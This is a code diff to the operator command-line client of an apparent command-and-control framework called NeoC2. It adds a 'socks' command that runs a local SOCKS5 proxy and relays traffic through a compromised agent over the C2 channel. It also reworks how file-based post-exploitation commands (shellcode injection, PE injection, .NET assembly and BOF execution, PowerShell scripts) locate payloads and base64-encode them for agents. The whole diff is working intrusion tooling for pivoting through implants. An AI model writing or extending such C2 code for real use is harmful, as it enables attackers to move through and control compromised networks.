@@ -15,6 +15,8 @@ from pathlib import Path
 import select
 import signal
 import subprocess
+import struct
+import base64
 
 # Initialize color support
 try:
@@ -154,7 +156,7 @@ class NeoC2RemoteCLI:
             'help', 'agent', 'listener', 'modules', 'run', 'pwsh', 'persist', 'pinject', 'peinject', 'encryption',
             'profile', 'protocol', 'stager', 'download', 'upload', 'interactive',
             'exit', 'quit', 'clear', 'status', 'task', 'result', 'save', 'addcmd',
-            'harvest', 'execute-bof', 'execute-assembly', 'cmd'
+            'harvest', 'execute-bof', 'execute-assembly', 'cmd', 'socks'
         ]
 
         options = [cmd for cmd in commands if cmd.startswith(text.lower())]
@@ -363,16 +365,22 @@ class NeoC2RemoteCLI:
 
             # Check if this is an extension command that needs client-side file lookup
             if command_parts and command_parts[0].lower() in ['execute-bof', 'execute-assembly', 'peinject', 'pwsh', 'pinject']:
-                modified_command = self._handle_extension_command(command)
-                if modified_command:
+                result = self._handle_extension_command(command)
+                if result and result != "FILE_NOT_FOUND_ON_CLIENT" and result != "NO_FILE_SPECIFIED":
+                    # File was found and processed successfully
                     command_data = {
                         'type': 'command',
-                        'command': modified_command,
+                        'command': result,
                         'token': self.auth_token,
                         'session_id': self.session_id
                     }
+                elif result == "FILE_NOT_FOUND_ON_CLIENT":
+                    # File was specified but not found, error was already printed
+                    # Return error response to prevent sending to server
+                    return {'success': False, 'error': f'File not found locally: {command_parts[1]}'}
                 else:
-                    # If file not found locally, send original command to server for fallback
+                    # _handle_extension_command returned "NO_FILE_SPECIFIED", which means no filename was provided
+                    # Send original command to server for usage info
                     command_data = {
                         'type': 'command',
                         'command': command,
@@ -445,6 +453,200 @@ class NeoC2RemoteCLI:
             self.connected = False
             return None
 
+    def start_socks_proxy(self, local_port=1080):
+        try:
+            # Create a socket to listen for SOCKS connections from local tools (like proxychains)
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket.bind(('127.0.0.1', local_port))
+            server_socket.listen(5)
+
+            print(f"{green('[+]')} SOCKS5 proxy listening on 127.0.0.1:{local_port}")
+            print(f"{green('[+]')} Configure your tools to use socks5://127.0.0.1:{local_port}")
+
+            while True:
+                try:
+                    client_conn, client_addr = server_socket.accept()
+                    print(f"{green('[+]')} New SOCKS client connection from {client_addr}")
+
+                    # Start a thread to handle this SOCKS client
+                    client_thread = threading.Thread(
+                        target=self._handle_socks_client,
+                        args=(client_conn, client_addr),
+                        daemon=True
+                    )
+                    client_thread.start()
+
+                except Exception as e:
+                    print(f"{red('[-]')} Error accepting SOCKS connection: {str(e)}")
+                    break
+
+        except Exception as e:
+            print(f"{red('[-]')} Error starting SOCKS proxy: {str(e)}")
+        finally:
+            try:
+                server_socket.close()
+            except:
+                pass
+
+    def _handle_socks_client(self, client_conn, client_addr):
+        try:
+            # Read the version identifier and number of methods
+            header = self._read_exact(client_conn, 2)
+            if not header or header[0] != 0x05:
+                print(f"{red('[-]')} Invalid SOCKS5 version from {client_addr}")
+                client_conn.close()
+                return
+
+            n_methods = header[1]
+            if n_methods <= 0 or n_methods > 255:
+                print(f"{red('[-]')} Invalid number of methods from {client_addr}")
+                client_conn.close()
+                return
+
+            # Read the methods
+            methods = self._read_exact(client_conn, n_methods)
+            if not methods:
+                client_conn.close()
+                return
+
+            # Send no-authentication required response
+            client_conn.sendall(b'\x05\x00')
+
+            # Read request header
+            request_header = self._read_exact(client_conn, 4)
+            if not request_header or request_header[0] != 0x05:
+                print(f"{red('[-]')} Invalid SOCKS5 request version from {client_addr}")
+                client_conn.close()
+                return
+
+            cmd = request_header[1]
+            if cmd != 0x01:  # CONNECT command
+                # Send error response
+                client_conn.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')  # Command not supported
+                client_conn.close()
+                return
+
+            addr_type = request_header[3]
+
+            # Read address and port
+            if addr_type == 0x01:  # IPv4
+                addr_bytes = self._read_exact(client_conn, 4)
+                port_bytes = self._read_exact(client_conn, 2)
+                if not addr_bytes or not port_bytes:
+                    client_conn.close()
+                    return
+                addr = socket.inet_ntoa(addr_bytes)
+            elif addr_type == 0x03:  # Domain name
+                addr_len = ord(self._read_exact(client_conn, 1))
+                addr_bytes = self._read_exact(client_conn, addr_len)
+                if not addr_bytes:
+                    client_conn.close()
+                    return
+                addr = addr_bytes.decode('utf-8')
+                port_bytes = self._read_exact(client_conn, 2)
+                if not port_bytes:
+                    client_conn.close()
+                    return
+            elif addr_type == 0x04:  # IPv6
+                addr_bytes = self._read_exact(client_conn, 16)
+                port_bytes = self._read_exact(client_conn, 2)
+                if not addr_bytes or not port_bytes:
+                    client_conn.close()
+                    return
+                addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
+            else:
+                # Send error response
+                client_conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')  # Address type not supported
+                client_conn.close()
+                return
+
+            port = int.from_bytes(port_bytes, 'big')
+
+            # Prepare address (use bracketed IPv6 when necessary)
+            if ':' in addr:  # IPv6
+                target_addr = f"[{addr}]:{port}"
+            else:  # IPv4 or domain
+                target_addr = f"{addr}:{port}"
+
+            print(f"{green('[*]')} SOCKS5 connect request to {target_addr}")
+
+            # Send success response - we'll relay to the agent via the C2 channel
+            client_conn.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
+
+            print(f"{green('[+]')} Connected to {target_addr} via C2 channel")
+
+            self._relay_data_through_c2(client_conn, addr, port)
+
+        except Exception as e:
+            print(f"{red('[-]')} Error in SOCKS5 handler: {str(e)}")
+            try:
+                client_conn.close()
+            except:
+                pass
+
+    def _read_exact(self, sock, length):
+        data = b''
+        while len(data) < length:
+            chunk = sock.recv(length - len(data))
+            if not chunk:
+                return None
+            data += chunk
+        return data
+
+    def _relay_data_through_c2(self, client_socket, target_addr, target_port):
+        try:
+            # Connect to the server's CLI SOCKS proxy port (determined when 'socks' command was run)
+            # This assumes the server has started the CLI SOCKS proxy for this agent
+            server_port = getattr(self, 'server_socks_proxy_port', 1080)  # Default to 1080 if not set
+            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            proxy_socket.connect((self.server_host, server_port))
+
+            # Now relay data between the client and the server's CLI SOCKS proxy
+            # which will forward to the agent
+            def relay(src, dst, name1, name2):
+                try:
+                    while True:
+                        data = src.recv(4096)
+                        if not data:
+                            break
+                        dst.sendall(data)
+                except Exception as e:
+                    print(f"{red('[-]')} Relay error between {name1} and {name2}: {str(e)}")
+                finally:
+                    try:
+                        src.close()
+                    except:
+                        pass
+                    try:
+                        dst.close()
+                    except:
+                        pass
+
+            # Start two threads for bidirectional relay
+            thread1 = threading.Thread(target=relay, args=(client_socket, proxy_socket, "client", "server_cli_proxy"), daemon=True)
+            thread2 = threading.Thread(target=relay, args=(proxy_socket, client_socket, "server_cli_proxy", "client"), daemon=True)
+
+            thread1.start()
+            thread2.start()
+
+            # Wait for threads to complete
+            thread1.join()
+            thread2.join()
+
+        except ConnectionRefusedError:
+            print(f"{red('[-]')} Connection refused: Server CLI SOCKS proxy may not be running. Make sure to run 'socks' command first.")
+            try:
+                client_socket.close()
+            except:
+                pass
+        except Exception as e:
+            print(f"{red('[-]')} Error in C2 data relay: {str(e)}")
+            try:
+                client_socket.close()
+            except:
+                pass
+
     def _handle_extension_command(self, command):
         import os
         import base64
@@ -458,59 +660,92 @@ class NeoC2RemoteCLI:
         if len(command_parts) < 2:
             return None  # Not enough arguments
 
-        file_path = command_parts[1]
+        # Parse arguments to extract the file path
+        # Handle both formats: pwsh whoami.ps1 and pwsh script_path=whoami.ps1
+        file_path = None
+        arguments = []
+
+        # Check if the command uses key-value format like script_path=whoami.ps1
+        for part in command_parts[1:]:
+            if '=' in part:
+                # This is a key-value pair, check if it's for file path
+                key, value = part.split('=', 1)
+                key_lower = key.lower()
+
+                # Identify the file path based on the command type
+                if cmd_name == 'pwsh' and key_lower in ['script_path', 'scriptpath']:
+                    file_path = value
+                elif cmd_name == 'execute-bof' and key_lower in ['bof_path', 'bofpath']:
+                    file_path = value
+                elif cmd_name == 'execute-assembly' and key_lower in ['assembly_path', 'assemblypath']:
+                    file_path = value
+                elif cmd_name == 'peinject' and key_lower in ['pe_file', 'pefile']:
+                    file_path = value
+                elif cmd_name == 'pinject' and key_lower in ['shellcode', 'script_path', 'scriptpath']:
+                    file_path = value
+                else:
+                    arguments.append(part)  # Add as regular argument
+            else:
+                # This is a positional argument
+                if file_path is None:
+                    file_path = part  # First positional argument is the file path
+                else:
+                    arguments.append(part)  # Additional positional arguments
+
+        if file_path is None:
+            return "NO_FILE_SPECIFIED"  # No file path found, indicate this specifically
 
         # Define file search paths for different extension types
         if cmd_name == 'execute-bof':
             search_paths = [
-                os.path.join('modules', 'external', 'bof', file_path),
-                os.path.join('modules', 'external', file_path),
+                os.path.join('cli', 'extensions', 'bof', file_path),
+                os.path.join('cli', 'extensions', file_path),
                 file_path,  # Direct path
                 os.path.join(os.getcwd(), file_path),
-                os.path.join('modules', 'external', 'bof', os.path.basename(file_path)),
-                os.path.join('modules', 'external', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', 'bof', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', os.path.basename(file_path)),
             ]
 
         elif cmd_name == 'execute-assembly':
             search_paths = [
-                os.path.join('modules', 'external', 'assemblies', file_path),
-                os.path.join('modules', 'external', file_path),
+                os.path.join('cli', 'extensions', 'assemblies', file_path),
+                os.path.join('cli', 'extensions', file_path),
                 file_path,  # Direct path
                 os.path.join(os.getcwd(), file_path),
-                os.path.join('modules', 'external', 'assemblies', os.path.basename(file_path)),
-                os.path.join('modules', 'external', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', 'assemblies', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', os.path.basename(file_path)),
             ]
 
         elif cmd_name == 'peinject':
             search_paths = [
-                os.path.join('modules', 'external', file_path),
-                os.path.join('modules', 'external', 'pe', file_path),
+                os.path.join('cli', 'extensions', file_path),
+                os.path.join('cli', 'extensions', 'pe', file_path),
                 file_path,  # Direct path
                 os.path.join(os.getcwd(), file_path),
-                os.path.join('modules', 'external', os.path.basename(file_path)),
-                os.path.join('modules', 'external', 'pe', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', 'pe', os.path.basename(file_path)),
             ]
 
         elif cmd_name == 'pwsh':
             # For pwsh, we look for PowerShell script files
             search_paths = [
-                os.path.join('modules', 'external', 'powershell', file_path),
-                os.path.join('modules', 'external', file_path),
+                os.path.join('cli', 'extensions', 'powershell', file_path),
+                os.path.join('cli', 'extensions', file_path),
                 file_path,  # Direct path
                 os.path.join(os.getcwd(), file_path),
-                os.path.join('modules', 'external', 'powershell', os.path.basename(file_path)),
-                os.path.join('modules', 'external', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', 'powershell', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', os.path.basename(file_path)),
             ]
 
         elif cmd_name == 'pinject':
-            # For pinject, we look for shellcode files in the external directory
+            # For pinject, we look for shellcode files in the extensions directory
             search_paths = [
-                os.path.join('modules', 'external', file_path),
-                os.path.join('modules', 'external', 'shellcode', file_path),
+                os.path.join('cli', 'extensions', file_path),
+                os.path.join('cli', 'extensions', 'shellcode', file_path),
                 file_path,  # Direct path
                 os.path.join(os.getcwd(), file_path),
-                os.path.join('modules', 'external', os.path.basename(file_path)),
-                os.path.join('modules', 'external', 'shellcode', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', os.path.basename(file_path)),
+                os.path.join('cli', 'extensions', 'shellcode', os.path.basename(file_path)),
             ]
         else:
             return None
@@ -544,20 +779,22 @@ class NeoC2RemoteCLI:
                     encoded_content = "pe" + encoded_content
 
                 # Reconstruct the command with the base64 encoded content
-                if len(command_parts) > 2:
-                    # If there are additional arguments, include them
-                    additional_args = ' '.join(command_parts[2:])
-                    new_command = f"{cmd_name} {encoded_content} {additional_args}"
+                # Use the original command format to preserve arguments
+                original_args = [part for part in command_parts[1:] if '=' not in part or part.split('=', 1)[0].lower() not in ['script_path', 'scriptpath', 'bof_path', 'bofpath', 'assembly_path', 'assemblypath', 'pe_file', 'pefile', 'shellcode']]
+                if original_args:
+                    new_command = f"{cmd_name} {encoded_content} {' '.join(original_args)}"
                 else:
                     new_command = f"{cmd_name} {encoded_content}"
 
                 return new_command
             except Exception as e:
+                # Print a clean error message when file reading fails
                 print(f"{red('[-]')} Error reading file {found_file_path}: {str(e)}")
-                return None
+                return "FILE_NOT_FOUND_ON_CLIENT"  # Special marker to indicate file error
         else:
-            # File not found on client side, let server handle fallback
-            return None
+            # File not found on client side, print error and return special marker
+            print(f"{red('[-]')} File not found: {file_path}")
+            return "FILE_NOT_FOUND_ON_CLIENT"  # Special marker to indicate file not found
 
     def print_result(self, message, status):
         if status == 'file_download':
@@ -694,6 +931,74 @@ class NeoC2RemoteCLI:
                     continue
                 elif command.lower().startswith('agent unmonitor'):
                     self._handle_agent_unmonitor(command)
+                    continue
+                elif command.lower().startswith('socks'):
+                    # Parse the command - format is always: socks <agent_id> [port]
+                    parts = command.strip().split()
+
+                    if len(parts) < 2:
+                        print(f"{red('[-]')} Usage: socks <agent_id> [port]")
+                        continue
+
+                    # First arg should be agent ID
+                    agent_id = parts[1]
+                    local_socks_port = 1080  # Default local port
+
+                    # Check if there's a second arg for port
+                    if len(parts) > 2:
+                        try:
+                            port_arg = int(parts[2])
+                            if 1 <= port_arg <= 65535:
+                                local_socks_port = port_arg
+                            else:
+                                print(f"{red('[-]')} Port must be between 1 and 65535")
+                                continue
+                        except ValueError:
+                            print(f"{red('[-]')} Invalid port number: {parts[2]}")
+                            continue
+
+                    # Send command to start CLI SOCKS proxy on server
+                    cli_socks_cmd = f"cli_socks_proxy start {agent_id} 1080"
+                    socks_start_response = self.send_command(cli_socks_cmd)
+                    if socks_start_response and socks_start_response.get('status') == 'success':
+                        print(f"{green('[+]')} Server CLI SOCKS proxy started for agent {agent_id} on port 1080")
+                    else:
+                        error_msg = socks_start_response.get('result', 'Unknown error') if socks_start_response else 'Failed to start server CLI SOCKS proxy'
+                        print(f"{red('[-]')} Failed to start server CLI SOCKS proxy: {error_msg}")
+                        continue
+
+                    # Store the server port to use in _relay_data_through_c2
+                    self.server_socks_proxy_port = 1080
+                    self.current_agent_for_socks = agent_id  # Store for potential use
+
+                    print(f"{green('[*]')} Starting local SOCKS5 proxy on port {local_socks_port}...")
+                    print(f"{green('[*]')} Use Ctrl+C to stop the proxy")
+                    self.start_socks_proxy(local_socks_port)
+                    continue
+                elif command.lower() == 'socks stop':
+                    # Stop the server's CLI SOCKS proxy
+                    agent_id = getattr(self, 'current_agent_for_socks', None)
+
+                    # If no agent was used for socks, try current agent if in interactive mode
+                    if not agent_id and self.is_interactive_mode and self.current_agent:
+                        agent_id = self.current_agent
+                    elif not agent_id:
+                        print(f"{red('[-]')} No SOCKS proxy was started. Usage: socks <agent_id> [port]")
+                        continue
+
+                    # Send command to stop CLI SOCKS proxy on server
+                    cli_socks_cmd = f"cli_socks_proxy stop {agent_id}"
+                    socks_stop_response = self.send_command(cli_socks_cmd)
+                    if socks_stop_response and socks_stop_response.get('status') == 'success':
+                        print(f"{green('[+]')} Server CLI SOCKS proxy stopped for agent {agent_id}")
+                        # Clear the stored port and agent
+                        if hasattr(self, 'server_socks_proxy_port'):
+                            delattr(self, 'server_socks_proxy_port')
+                        if hasattr(self, 'current_agent_for_socks'):
+                            delattr(self, 'current_agent_for_socks')
+                    else:
+                        error_msg = socks_stop_response.get('result', 'Unknown error') if socks_stop_response else 'Failed to stop server CLI SOCKS proxy'
+                        print(f"{red('[-]')} Failed to stop server CLI SOCKS proxy: {error_msg}")
                     continue
 
                 response = self.send_command(command)
@@ -898,6 +1203,25 @@ class NeoC2RemoteCLI:
     def disconnect(self):
         try:
             if self.connected:
+                # Try to stop the server's CLI SOCKS proxy if it was started
+                agent_id = getattr(self, 'current_agent_for_socks', None)
+                if not agent_id and hasattr(self, 'current_agent') and self.current_agent:
+                    agent_id = self.current_agent
+
+                if agent_id:
+                    try:
+                        cli_socks_cmd = f"cli_socks_proxy stop {agent_id}"
+                        # Send this command but don't wait for response since we're disconnecting
+                        cmd_data = {
+                            'type': 'command',
+                            'command': cli_socks_cmd,
+                            'token': self.auth_token,
+                            'session_id': self.session_id
+                        }
+                        self._send_data(cmd_data)
+                    except:
+                        pass  # Ignore errors when disconnecting
+
                 disconnect_data = {
                     'type': 'disconnect',
                     'token': self.auth_token,
